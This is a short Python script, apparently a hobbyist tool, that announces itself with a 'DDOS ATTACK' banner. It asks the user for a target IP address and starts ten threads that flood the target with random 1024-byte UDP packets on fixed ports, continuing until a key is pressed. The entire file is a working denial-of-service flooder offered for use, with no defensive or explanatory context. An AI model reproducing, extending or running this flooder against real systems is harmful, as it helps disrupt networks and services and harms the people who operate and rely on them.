import socket
import threading
import sys
import random
import keyboard
import queue
import pyfiglet

lock=threading.Lock()
def ddos(name,ip,port):
    global sent
    byte=random._urandom(1024)
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as s:
            sent=0
            while True:
                try:
                    if keyboard.is_pressed('a'):
                        sys.exit()
                    else:
                        pass
                    s.sendto(byte,(ip,port))
                    with lock:
                        sent+=1#all threads update the same variable
                    print('{} sent {} packet to {} through {}'.format(name,sent,ip,port))
                except socket.error:
                    sys.exit()
    except socket.error:
        print('error creating the socket')
        sys.exit()
port=[65422,65423,65424,65425,65426,65427,65428,65429,65430,65431]
q=queue.Queue()
pyfiglet.print_figlet('DDOS ATTACK')
pyfiglet.print_figlet('press a to stop sending packets')
ip=input('enter ip address:')
for i in range(10):
    t=threading.Thread(target=ddos,name='thread {}'.format(i+1),args=('thread {}'.format(i+1),ip,port[i]),daemon=True)
    q.put(t)
    t.start()
while not q.empty():
    t=q.get()
    t.join()
